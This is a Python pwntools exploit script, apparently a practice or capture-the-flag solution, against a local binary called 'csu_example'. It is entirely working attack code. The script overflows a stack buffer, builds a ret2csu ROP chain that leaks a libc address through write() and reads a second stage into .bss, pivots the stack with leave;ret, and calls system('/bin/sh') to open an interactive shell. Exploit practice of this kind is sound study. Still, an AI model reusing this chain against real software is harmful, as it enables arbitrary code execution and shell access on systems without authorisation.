from pwn import *

p = process("./csu_example")
e = ELF("./csu_example")
libc = e.libc

csu1 = 0x4006c0
csu2 = 0x4006d6
leave_ret = 0x00400672
pop_rdi = 0x004006e3
ret = 0x004004c6

bss = 0x00601000 + 0x800
write_got = e.got['write']
write_offset = libc.symbols['write']
read_got = e.got['read']
system_offset = libc.symbols['system']

# write(1, write_got, 8) -> libc leak
payload = b'A'*0x100            #buf
payload += b'B'*0x8             #sfp
payload += p64(csu2)            #ret
payload += b'C'*8               #add rsp+8
payload += p64(0)               #rbx
payload += p64(1)               #rbp
payload += p64(write_got)       #r12
payload += p64(1)               #r13 -> edi
payload += p64(write_got)       #r14 -> rsi
payload += p64(8)               #r15 -> rdx
payload += p64(csu1)

# read(0, bss, 0x150) -> bss에서 0x150만큼 읽어오기
payload += b'D'*8               #add rsp+8
payload += p64(0)               #rbx
payload += p64(1)               #rbp
payload += p64(read_got)        #r12
payload += p64(0)               #r13 -> edi
payload += p64(bss)             #r14 -> rsi
payload += p64(0x150)           #r15 -> rdx
payload += p64(csu1)

# rsp -> bss by stack pivoting
payload += b'E'*16
payload += p64(bss)             #rbp
payload += b'F'*32
payload += p64(leave_ret)

p.send(payload)

# system("/bin/sh")
p.recvline()                  #hello\n
write_addr = u64(p.recv(8).ljust(8, b"\x00"))
libc_base = write_addr - write_offset

system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b"/bin/sh"))[0]
#binsh = libc_base + 0x1b3e1a

payload = b'G'*8                #leave
payload += p64(pop_rdi)         #ret
payload += p64(binsh)
payload += p64(ret)             #stack align
payload += p64(system_addr)

#pause()
p.send(payload)

p.interactive()